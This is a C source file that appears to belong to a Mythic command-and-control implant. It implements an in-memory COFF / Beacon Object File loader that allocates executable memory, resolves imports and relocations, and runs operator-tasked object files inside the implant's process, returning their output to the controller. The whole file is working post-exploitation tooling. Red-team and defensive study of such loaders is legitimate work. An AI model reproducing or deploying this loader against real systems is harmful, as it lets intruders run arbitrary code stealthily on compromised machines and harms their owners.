#include "Tasks/InlineExecute.h"

#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Config.h"
#include "BeaconCompatibility.h"

#if defined(INCLUDE_CMD_INLINE_EXECUTE) || defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)

/*
    Most code is from here https://github.com/Ap3x/COFF-Loader/tree/main/Src
*/

/*
    COFF Loader Supporting Functions
*/
BOOL InternalFunctionMatch(char* StrippedSymbolName) {
    if (STR_EQUALS(StrippedSymbolName, "Beacon")  ||
        STR_EQUALS(StrippedSymbolName, "GetProcAddress") ||
        STR_EQUALS(StrippedSymbolName, "GetModuleHandleA") ||
        STR_EQUALS(StrippedSymbolName, "toWideChar") ||
        STR_EQUALS(StrippedSymbolName, "LoadLibraryA") ||
        STR_EQUALS(StrippedSymbolName, "FreeLibrary"))
    {
        return TRUE;
    }
    return FALSE;
}

void* ProcessBeaconSymbols(char* SymbolName, BOOL InternalFunction) {
    void* functionaddress = NULL;
    char localSymbolNameCopy[1024] = { 0 };
    InternalFunction = FALSE;
    char* locallib = NULL;
    char* localfunc = SymbolName + sizeof(PREPENDSYMBOLVALUE) - 1;
    HMODULE llHandle = NULL;
    // strncpy_s(localSymbolNameCopy, SymbolName, sizeof(localSymbolNameCopy) - 1);
    strncpy_s(localSymbolNameCopy, sizeof(localSymbolNameCopy), SymbolName, sizeof(localSymbolNameCopy) - 1);
    char* context = NULL;

    if (InternalFunctionMatch(SymbolName + sizeof(PREPENDSYMBOLVALUE) - 1)) {
        InternalFunction = TRUE;

        localfunc = SymbolName + strlen(PREPENDSYMBOLVALUE);
        UINT32 hash = custom_hash(localfunc);
    
        BeaconCompatibilityEnsureHashes();

        // Compare function hashes
        for (int tempcounter = 0; tempcounter < INTERNAL_FUNCTIONS_COUNT; tempcounter++) {
            if (InternalFunctions[tempcounter][0] != NULL) {
                if (hash == (UINT32)(ULONG_PTR)InternalFunctions[tempcounter][0]) {
                    functionaddress = (void*)InternalFunctions[tempcounter][1];
                    return functionaddress;
                }
            }
        }
    }
    else {
        //_dbg("\t\tExternal Symbol\n");
        locallib = strtok_s(localSymbolNameCopy + sizeof(PREPENDSYMBOLVALUE) - 1, "$", &context);
        llHandle = LoadLibraryA(locallib);

        //_dbg("\t\tHandle: 0x%lx\n", llHandle);
        localfunc = strtok_s(NULL, "$", &context);
        localfunc = strtok_s(localfunc, "@", &context);
        functionaddress = GetProcAddress(llHandle, localfunc);
        //_dbg("\t\tProcAddress: 0x%p\n", functionaddress);
        return functionaddress;
    }
}

BOOL ExecuteEntry(COFF_t* COFF, char* func, char* args, unsigned long argSize) {
    VOID(*foo)(char* in, UINT32 datalen) = NULL;

    if (!func || !COFF->FileBase)
	{
		_dbg("No entry provided");
		return FALSE;
	}

    char* stringTable = (char*)(COFF->SymbolTable + COFF->FileHeader->NumberOfSymbols);
    for (UINT32 counter = 0; counter < COFF->FileHeader->NumberOfSymbols; counter += 1 + COFF->SymbolTable[counter].NumberOfAuxSymbols)
    {
        char* symName;
        char inlineName[9] = {0};
        if (COFF->SymbolTable[counter].first.Name[0] != 0)
		{
            memcpy(inlineName, COFF->SymbolTable[counter].first.Name, 8);
            symName = inlineName;
        }
		else 
		{
            symName = stringTable + COFF->SymbolTable[counter].first.value[1];
        }
		
        if (strcmp(symName, func) == 0)
		{
            UINT16 secNum = COFF->SymbolTable[counter].SectionNumber;
            if (secNum == 0 || COFF->SectionMapped[secNum - 1] == NULL)
			{
                //_dbg("Entry symbol found but section not loaded (secNum=%d)\n", secNum);
                continue;
            }
            foo = (void(*)(char*, UINT32))((char*)COFF->SectionMapped[secNum - 1] + COFF->SymbolTable[counter].Value);
        }
    }

    if (!foo)
	{
		_dbg("Couldn't find entry point");
		return FALSE;
	}

	_dbg("Trying to run: 0x%p\n\n", foo);

    foo((char*)args, argSize);
    return TRUE;
}

void RelocationTypeParse(COFF_t* COFF, void** SectionMapped, int SectionNumber, BOOL InternalFunction, void* FunctionAddrPTR, char* FunctionMapping) {
    UINT32 offsetAddr = 0;
    UINT64 longOffsetAddr = 0;
    unsigned int Type = COFF->Relocation->Type;

    if (FunctionAddrPTR == NULL) {
        UINT16 symSecNum = COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber;
        if (symSecNum == 0) return;
        if (SectionMapped[symSecNum - 1] == NULL) return;
    }

    if (Type == IMAGE_REL_AMD64_ADDR64)
    {
        memcpy(&longOffsetAddr, (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, sizeof(UINT64));
        //_dbg("\tReadin longOffsetValue : 0x%llX\n", longOffsetAddr);
        longOffsetAddr = (UINT64)((char*)SectionMapped[COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber - 1] + (UINT64)longOffsetAddr);
        longOffsetAddr += COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].Value;
        //_dbg("\tModified longOffsetValue : 0x%llX Base Address: %p\n", longOffsetAddr, SectionMapped[COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber - 1]);
        memcpy((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, &longOffsetAddr, sizeof(UINT64));
    }
    else if (COFF->Relocation->Type == IMAGE_REL_AMD64_ADDR32NB) {
        memcpy(&offsetAddr, (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, sizeof(INT32));
        //_dbg("\tReadin OffsetValue : 0x%0X\n", offsetAddr);
        //_dbg("\t\tReferenced Section: 0x%X\n", (char*)SectionMapped[COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber - 1] + offsetAddr);
        //_dbg("\t\tEnd of Relocation Bytes: 0x%X\n", (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress + 4);
        offsetAddr = ((char*)((char*)SectionMapped[COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber - 1] + offsetAddr) - ((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress + 4));
        offsetAddr += COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].Value;
        //_dbg("\tSetting 0x%p to OffsetValue: 0x%X\n", (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, offsetAddr);
        memcpy((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, &offsetAddr, sizeof(UINT32));
    }
    else if (Type == IMAGE_REL_AMD64_REL32) {
        if (FunctionAddrPTR != NULL) {
            memcpy(FunctionMapping + (COFF->FunctionMappingCount * 8), &FunctionAddrPTR, sizeof(UINT64));
            offsetAddr = (INT32)((FunctionMapping + (COFF->FunctionMappingCount * 8) ) - ((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress + 4));
            offsetAddr += COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].Value;
            //_dbg("\t\tSetting internal function at 0x%p to relative address: 0x%X\n", (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, offsetAddr);
            memcpy((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, &offsetAddr, sizeof(UINT32));
            InternalFunction = FALSE;
            COFF->FunctionMappingCount++;
        }
        else {
            // This should copy the relative offset for the specified data section into offsetAddr
            memcpy(&offsetAddr, (void*)((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress), sizeof(UINT32));
            //_dbg("\tReadin Offset Value : 0x%llX\n", offsetAddr);
            // Getting the symbols section then adding the offset to get the value stored.
            offsetAddr += (UINT32)((char*)SectionMapped[COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber - 1] - ((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress + 4));
            // Since the StorageClass is going to be IMAGE_SYM_CLASS_STATIC or IMAGE_SYM_CLASS_EXTERNAL with a non-zero SymbolTableIndex
            offsetAddr += COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].Value;
            //_dbg("\t\tSetting 0x%p to relative address: 0x%X\n", (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, offsetAddr);
            memcpy((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, &offsetAddr, sizeof(UINT32));
        }
    }
    else 
    {
        //_dbg("[!] Relocation Type Not Implemented\n");
    }
    //_dbg("\tValueNumber: 0x%X\n", COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].Value);
    //_dbg("\tSectionNumber: 0x%X\n", COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber);
}

BOOL CoffMap(char* FileData, COFF_RUNTIME_t* out)
{
    if (!FileData || !out)
        return FALSE;

    memset(out, 0, sizeof(COFF_RUNTIME_t));

    out->coff.FileBase = FileData;
    out->coff.FileHeader = (FileHeader_t*)out->coff.FileBase;
    out->coff.SymbolTable = (Symbol_t*)(out->coff.FileBase + out->coff.FileHeader->PointerToSymbolTable);
    out->coff.FunctionMappingCount = 0;
    out->coff.RelocationsCount = 0;
    out->numberOfSections = out->coff.FileHeader->NumberOfSections;

    out->sectionMapped = (void**)calloc(sizeof(char*) * (out->numberOfSections + 1), 1);
    if (!out->sectionMapped)
        return FALSE;
    out->coff.SectionMapped = out->sectionMapped;

    if ((int)out->coff.FileHeader->Machine != IMAGE_FILE_MACHINE_AMD64) {
        _dbg("[!] This common object file format is not supported yet :)");
        free(out->sectionMapped);
        out->sectionMapped = NULL;
        return FALSE;
    }

    for (byte i = 0; i < out->numberOfSections; i++) {
        Section_t* section = (Section_t*)(out->coff.FileBase + sizeof(FileHeader_t) + (i * sizeof(Section_t)));

        out->sectionMapped[i] = (char*)VirtualAlloc(NULL, section->SizeOfRawData, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);

        if (section->PointerToRawData != 0) {
            memcpy(out->sectionMapped[i], out->coff.FileBase + section->PointerToRawData, section->SizeOfRawData);
        }
        else {
            memset(out->sectionMapped[i], 0, section->SizeOfRawData);
        }

        if (!strcmp(section->Name, ".text")) {
            out->coff.RawTextData = out->sectionMapped[i];
        }

        out->coff.RelocationsCount += section->NumberOfRelocations;
    }

    out->functionMapping = (char*)VirtualAlloc(NULL, out->coff.RelocationsCount * 8, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
    if (!out->functionMapping && out->coff.RelocationsCount > 0) {
        CoffUnmap(out);
        return FALSE;
    }

    for (int s = 0; s < out->numberOfSections; s++) {
        if (out->sectionMapped[s] == NULL) continue;
        Section_t* section = (Section_t*)(out->coff.FileBase + sizeof(FileHeader_t) + (s * sizeof(Section_t)));
        out->coff.RelocationsTextPTR = out->coff.FileBase + section->PointerToRelocations;

        for (int i = 0; i < section->NumberOfRelocations; i++) {
            UINT32 symbolOffset = 0;
            void* funcptrlocation = NULL;
            out->coff.Relocation = (Relocation_t*)(out->coff.RelocationsTextPTR + (i * sizeof(Relocation_t)));

            symbolOffset = out->coff.SymbolTable[out->coff.Relocation->SymbolTableIndex].first.value[1];

            if (out->coff.SymbolTable[out->coff.Relocation->SymbolTableIndex].first.Name[0] != 0) {
                RelocationTypeParse(&out->coff, out->sectionMapped, s, FALSE, NULL, NULL);
            }
            else {
                BOOL internalFunctionCheck = FALSE;
                funcptrlocation = ProcessBeaconSymbols(((char*)(out->coff.SymbolTable + out->coff.FileHeader->NumberOfSymbols)) + symbolOffset, &internalFunctionCheck);
                if (funcptrlocation == NULL && out->coff.SymbolTable[out->coff.Relocation->SymbolTableIndex].SectionNumber == 0) {
                    _dbg("[!] Failed to resolve symbol. Symbol : %s\n", ((char*)(out->coff.SymbolTable + out->coff.FileHeader->NumberOfSymbols)) + symbolOffset);
                }

                RelocationTypeParse(&out->coff, out->sectionMapped, s, &internalFunctionCheck, funcptrlocation, out->functionMapping);
            }
        }
    }

    return TRUE;
}

BOOL CoffExecute(COFF_RUNTIME_t* rt, char* EntryName, char* argumentdata, unsigned long argumentsize)
{
    if (!rt || !EntryName)
        return FALSE;
    return ExecuteEntry(&rt->coff, EntryName, argumentdata, argumentsize);
}

VOID CoffUnmap(COFF_RUNTIME_t* rt)
{
    if (!rt)
        return;

    if (rt->sectionMapped) {
        for (byte i = 0; i < rt->numberOfSections; i++) {
            if (rt->sectionMapped[i] != NULL) {
                VirtualFree(rt->sectionMapped[i], 0, MEM_RELEASE);
                rt->sectionMapped[i] = NULL;
            }
        }
        free(rt->sectionMapped);
        rt->sectionMapped = NULL;
    }

    if (rt->functionMapping) {
        VirtualFree(rt->functionMapping, 0, MEM_RELEASE);
        rt->functionMapping = NULL;
    }

    memset(rt, 0, sizeof(COFF_RUNTIME_t));
}

BOOL RunCOFF(char* FileData, DWORD* DataSize, char* EntryName, char* argumentdata, unsigned long argumentsize)
{
    COFF_RUNTIME_t rt = { 0 };
    BOOL Success = FALSE;

    (void)DataSize;

    if (!CoffMap(FileData, &rt))
        return FALSE;

    Success = CoffExecute(&rt, EntryName, argumentdata, argumentsize);
    CoffUnmap(&rt);
    return Success;
}


#ifdef INCLUDE_CMD_INLINE_EXECUTE
/**
 * @brief Execute a Beacon Object File in current process thread.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] arguments PARSER struct containing task data.
 * @return VOID
 */
VOID InlineExecute(PCHAR taskUuid, PPARSER arguments)
{
    /* Parse command arguments */
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("GOT %d arguments", nbArg);

    if ( nbArg < 2 )
    {
        _err("Invalid number of arguments");
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        return;
    }

    PCHAR  BofData   = NULL;
    PCHAR  BofArgs   = NULL;
    SIZE_T bofLen    = 0;
    SIZE_T argLen    = 0;

    /* Get BOF and Arguments */
    BofArgs = ParserGetString(arguments, &argLen);
    BofData = ParserGetString(arguments, &bofLen);

    if ( BofData == NULL || bofLen == 0 )
    {
        _err("Invalid BOF data");
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        return;
    }

    /* Execute the BOF with pre-packed arguments */
    if ( !RunCOFF(BofData, &bofLen, "go", BofArgs, argLen) ) 
    {
        _err("Failed to execute BOF in current thread.");
        PackageError(taskUuid, ERROR_MYTHIC_BOF);
        return;
    }

    /* Read output from Global Beacon Output Buffer */
    PCHAR OutData = NULL;
	INT   OutSize = 0;
    
    OutData       = BeaconGetOutputData(&OutSize);

	if ( OutData == NULL || OutSize == 0 ) 
    {
        _err("Failed get BOF output");
        PackageError(taskUuid, ERROR_MYTHIC_BOF);
        return;
	}

    PPackage locals = PackageInit(0, FALSE);
    PackageAddString(locals, OutData, FALSE);
    
    // Success
    PackageComplete(taskUuid, locals);

// Cleanup
    free(OutData);                  // allocated in BeaconOutput()
    PackageDestroy(locals);
}
#endif /* INCLUDE_CMD_INLINE_EXECUTE */

#endif  //INCLUDE_CMD_INLINE_EXECUTE || INCLUDE_CMD_ASYNC_EXECUTE || INCLUDE_CMD_JOBKILL || INCLUDE_CMD_JOBS
